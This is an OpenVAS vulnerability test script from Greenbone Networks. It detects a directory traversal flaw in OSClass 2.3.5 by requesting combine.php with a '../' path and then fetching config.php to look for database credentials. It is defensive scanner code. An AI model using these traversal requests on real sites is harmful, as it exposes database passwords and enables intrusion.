###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_osclass_52336.nasl 3047 2016-04-11 13:58:34Z benallard $
#
# OSClass Directory Traversal and Arbitrary File Upload Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "OSClass is prone to a directory-traversal vulnerability and an arbitrary-file-
upload vulnerability.

An attacker can exploit these issues to obtain sensitive information
and to upload arbitrary code and run it in the context of the
webserver process.

OSClass 2.3.5 is vulnerable; prior versions may also be affected.";

tag_solution = "Updates are available. Please see the references for more information.";

if (description)
{
 script_id(103446);
 script_bugtraq_id(52336);
 script_version ("$Revision: 3047 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("OSClass Directory Traversal and Arbitrary File Upload Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52336");
 script_xref(name : "URL" , value : "http://osclass.org/2012/03/05/osclass-2-3-6/");
 script_xref(name : "URL" , value : "http://osclass.org/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521902");
 script_xref(name : "URL" , value : "http://www.codseq.it/advisories/osclass_directory_traversal_vulnerability");

 script_tag(name:"last_modification", value:"$Date: 2016-04-11 15:58:34 +0200 (Mon, 11 Apr 2016) $");
 script_tag(name:"creation_date", value:"2012-03-08 11:53:08 +0100 (Thu, 08 Mar 2012)");
 script_summary("Determine if it is possible to read the config.php");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/osclass/",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 

  if(http_vuln_check(port:port, url:url,pattern:'(This website is proudly using the.*OSClass|generator" content="OSClass)')) {

    url = string(dir, "/oc-content/themes/modern/combine.php?type=./../../../combine.php&files=combine.php");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(buf =~ "HTTP/1\.[1|0] 200" && "<?php" >< buf) {

      url = string(dir, "/combine.php?files=config.php");
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

      if("DB_USER" >< buf || "DB_PASSWORD" >< buf) {
        security_message(port:port);
        exit(0);
      }  
 
    }  

    exit(99);

  }
}

exit(0);

